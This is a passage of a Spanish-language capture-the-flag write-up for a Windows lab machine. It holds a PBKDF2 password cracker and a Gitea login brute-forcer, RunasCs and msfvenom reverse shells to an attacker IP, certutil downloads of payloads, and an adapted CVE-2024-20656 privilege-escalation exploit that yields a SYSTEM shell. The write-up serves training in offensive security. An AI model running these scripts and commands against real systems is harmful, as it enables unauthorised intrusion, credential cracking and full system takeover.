+</span></span><span style="display:flex;"><span>rockyou <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/share/wordlists/rockyou.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pbkdf2</span>(pwd, salt, iterations, dklen):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Creamos un objeto del hash, la pwd tiene que estar en formato bytes y el salt sin hexadecimal, por eso hacemos un binascii.unhexlify</span>
+</span></span><span style="display:flex;"><span>    hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>pbkdf2_hmac(<span style="color:#e6db74">&#39;sha256&#39;</span>, pwd, binascii<span style="color:#f92672">.</span>unhexlify(salt), iterations, dklen)<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>salt<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>hash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Bruteforcing...&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(rockyou, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> file:
+</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;Probando &#34;</span> <span style="color:#f92672">+</span> pwd<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>            hash <span style="color:#f92672">=</span> pbkdf2(pwd<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>encode(), salt, <span style="color:#ae81ff">50000</span>, <span style="color:#ae81ff">50</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (hash <span style="color:#f92672">==</span> real_hashed_pwd):
+</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;The motherfucking password ha sido crackeada: &#34;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    crack()
+</span></span></code></pre></div><ul>
+<li><code>salt</code>: La sal utilizada en el proceso de hashing, en formato hexadecimal.</li>
+<li><code>key</code>: El hash que estamos tratando de crackear.</li>
+<li><code>real_hashed_pwd</code>: Combinación del salt y el hash, en el mismo formato que se generará durante el proceso de crackeo.</li>
+<li><code>rockyou</code>: Ruta al archivo de wordlist <code>rockyou.txt</code>, que contiene una lista de posibles contraseñas.</li>
+</ul>
+<p>La función realiza lo siguiente:</p>
+<ol>
+<li>Convierte el salt de hexadecimal a binario.</li>
+<li>Genera un hash utilizando <code>hashlib.pbkdf2_hmac</code> con los parámetros especificados.</li>
+<li>Convierte el hash resultante a hexadecimal y lo combina con la sal en el formato <code>salt:hash</code></li>
+</ol>
+<p>Y ahora&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 crack.py 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bruteforcing...: The motherfucking password ha sido crackeada: <span style="color:#ae81ff">12345678</span>
+</span></span></code></pre></div><p>Perfecto, esta debe de ser la credencial de Emily.</p>
+<p>Lateralmente podríamos haber hecho fuerza bruta al Gitea y probablemente hubieramos tardado menos en conseguir esta credencial.</p>
+<p>De hecho, he hecho un script para hacer fuerza bruta y en términos de ahorro de tiempo, hubiera salido mas rentable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emily&#34;</span>
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.129.255.250:3000/user/login&#34;</span>
+</span></span><span style="display:flex;"><span>rockyou <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/share/wordlists/rockyou.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">def_handler</span>(a, b):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[x] Saliendo...&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT, def_handler)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_request</span>(username, pwd):
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(base_url)
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;_csrf&#34;</span> : r<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;_csrf&#39;</span>],
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;user_name&#34;</span>: username,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: pwd
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(base_url, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;Username or password is incorrect.&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;Bruteforcing...&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(rockyou, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> file:
+</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;Probando: &#34;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">=</span> pwd<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (do_request(username, password) <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>):
+</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;La madafakin contraseña es &#34;</span> <span style="color:#f92672">+</span> password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    brute()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 brute.py 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bruteforcing...: La madafakin contraseña es <span style="color:#ae81ff">12345678</span>
+</span></span></code></pre></div><p>Bueno, ya sabemos que la contraseña es <code>12345678</code></p>
+<p>Ahora con <code>RunasCs.exe</code> podemos pivotar de usuario, nos lo subimos en la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Windows\temp\work&gt; .\runascs.exe emily <span style="color:#ae81ff">12345678</span> cmd.exe -r <span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">71</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Running <span style="color:#66d9ef">in</span> session <span style="color:#ae81ff">0</span> with <span style="color:#66d9ef">process</span> <span style="color:#66d9ef">function</span> CreateProcessWithLogonW()
+</span></span><span style="display:flex;"><span>[+] Using Station\Desktop<span style="color:#960050;background-color:#1e0010">:</span> Service-0x0-24db497$\<span style="color:#66d9ef">Default</span>
+</span></span><span style="display:flex;"><span>[+] Async <span style="color:#66d9ef">process</span> <span style="color:#e6db74">&#39;C:\Windows\system32\cmd.exe&#39;</span> with pid <span style="color:#ae81ff">3632</span> created <span style="color:#66d9ef">in</span> background.
+</span></span></code></pre></div><p>Y conseguimos la shell como <code>emily</code> y la flag que está en <code>C:\Users\Emily\Desktop\user.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.255.250<span style="color:#f92672">]</span> <span style="color:#ae81ff">51697</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.19045.4651<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>compiled<span style="color:#ae81ff">\e</span>mily
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Ahora, me paso el <code>winpeas.exe</code> para ejecutarlo como el usuario <code>Emily</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Emily\Desktop<span style="color:#75715e">&gt;certutil.exe -urlcache -f http://10.10.14.71:8000/winpeas.exe winpeas.exe</span>
+</span></span><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.71:8000/winpeas.exe winpeas.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span></code></pre></div><p>Encontramos lo siguiente.</p>
+<pre tabindex="0"><code>���������͹ Found NFS Exports Files
+File: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\Web\Exports
+</code></pre><p><strong>He necesitado ver una pista para conseguir la escalada&hellip;</strong></p>
+<p>Si ejecutamos  <code>powershell Get-Service</code>, detectaremos la presencia de un servicio llamado <code>VSStandardCollectorService150</code>
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>No quiero entrar en detalles de este exploit pero este <a href="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/">artículo</a> lo explica perfectamente.</p>
+<p>Vamos a descargarnos este <a href="https://github.com/Wh04m1001/CVE-2024-20656">PoC</a></p>
+<p>Al principio de <code>main.cpp</code> vemos esta línea de código.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;def.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>WCHAR cmd[] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Program Files</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft Visual Studio</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">2022</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Community</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Team Tools</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">DiagnosticsHub</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Collector</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">VSDiagnostics.exe&#34;</span>;
+</span></span></code></pre></div><p>Tenemos que cambiarla por la versión de Visual Studio de la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Program<span style="color:#75715e"> Files (x86)\Microsoft Visual Studio&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 352B-98C6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Program Files (x86)\Microsoft Visual Studio
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>01/20/2024  11:13 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>01/20/2024  11:13 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>01/29/2024  10:07 PM    &lt;DIR&gt;          2019
+</span></span><span style="display:flex;"><span>01/20/2024  02:57 AM    &lt;DIR&gt;          Installer
+</span></span><span style="display:flex;"><span>01/20/2024  03:04 AM    &lt;DIR&gt;          Shared
+</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
+</span></span><span style="display:flex;"><span>               5 Dir(s)  10,079,305,728 bytes free
+</span></span></code></pre></div><p>Entonces lo cambiamos&hellip;
+<code>WCHAR cmd[] = L&quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe&quot;;</code></p>
+<p>Luego, tenemos la función <code>cb1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cb1</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[*] Oplock!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>Move(hFile2)) {}
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] File moved!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    CopyFile(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cmd.exe&#34;</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">ProgramData</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">VisualStudio</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">SetupWMI</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MofCompiler.exe&#34;</span>, FALSE);
+</span></span><span style="display:flex;"><span>    finished <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Esta función es la responsable de copiar un archivo hasta que la instrucción de mover un archivo anterior sea satisfactoria, por lo cual, podemos modificar esta función para copiar nuestra reverse shell en vez de ejecutar <code>cmd.exe</code></p>
+<p>Modificamos la línea&hellip;
+<code>CopyFile(L&quot;c:\\windows\\temp\\shell.exe&quot;, L&quot;C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe&quot;, FALSE);</code></p>
+<p>Ahora vamos a compilar el exploit.
+Importante hacerlo en el modo <code>Release</code> y no <code>Debug</code>
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Nos descargamos el exploit en la máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Windows\Temp<span style="color:#75715e">&gt;certutil.exe -urlcache -f -split http://10.10.14.71:8000/Expl.exe Expl.exe</span>
+</span></span><span style="display:flex;"><span>certutil.exe -urlcache -f -split http://10.10.14.71:8000/Expl.exe Expl.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  000000  ...
+</span></span><span style="display:flex;"><span>  029000
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span></code></pre></div><p>Generamos con <code>msfvenom</code> la reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.71 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe -o shell.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">460</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.exe
+</span></span></code></pre></div><p>Nos lo descargamos en la máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Windows\Temp<span style="color:#75715e">&gt;certutil.exe -urlcache -f -split http://10.10.14.71:8000/shell.exe shell.exe</span>
+</span></span><span style="display:flex;"><span>certutil.exe -urlcache -f -split http://10.10.14.71:8000/shell.exe shell.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  0000  ...
+</span></span><span style="display:flex;"><span>  1c00
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span></code></pre></div><p>Nos ponemos en escucha con <code>netcat</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ejecutamos el exploit&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Windows\Temp<span style="color:#75715e">&gt;.\Expl.exe</span>
+</span></span><span style="display:flex;"><span>.\Expl.exe
+</span></span><span style="display:flex;"><span>[+] Junction \\?\C:\307146c8-446d-4e27-989d-f86f0c401466 -&gt; \??\C:\dbb62632-3557-4fa5-857a-f8f680171122 created!
+</span></span><span style="display:flex;"><span>[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -&gt; \??\C:\Programdata created!
+</span></span><span style="display:flex;"><span>[+] Junction \\?\C:\307146c8-446d-4e27-989d-f86f0c401466 -&gt; \RPC Control created!
+</span></span><span style="display:flex;"><span>[+] Junction \\?\C:\307146c8-446d-4e27-989d-f86f0c401466 -&gt; \??\C:\dbb62632-3557-4fa5-857a-f8f680171122 created!
+</span></span><span style="display:flex;"><span>[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -&gt; \??\C:\Programdata\Microsoft created!
+</span></span><span style="display:flex;"><span>[+] Junction \\?\C:\307146c8-446d-4e27-989d-f86f0c401466 -&gt; \RPC Control created!
+</span></span><span style="display:flex;"><span>[+] Persmissions successfully reseted!
+</span></span><span style="display:flex;"><span>[*] Starting WMI installer.
+</span></span><span style="display:flex;"><span>[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
+</span></span><span style="display:flex;"><span>[*] Oplock!
+</span></span><span style="display:flex;"><span>[+] File moved!
+</span></span></code></pre></div><p>¡Y ya hemos escalado privilegios!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.255.250<span style="color:#f92672">]</span> <span style="color:#ae81ff">51726</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Versi�n 10.0.19045.4651<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\V</span>isualStudio<span style="color:#ae81ff">\S</span>etupWMI&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Máquina que sinceramente ha sido muy tediosa, y la mejor parte en mi opinión es lo que he aprendido de Git, la escalada de privilegios para mí ha sido un poco bastante tediosa para ser una máquina de dificultad media.</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
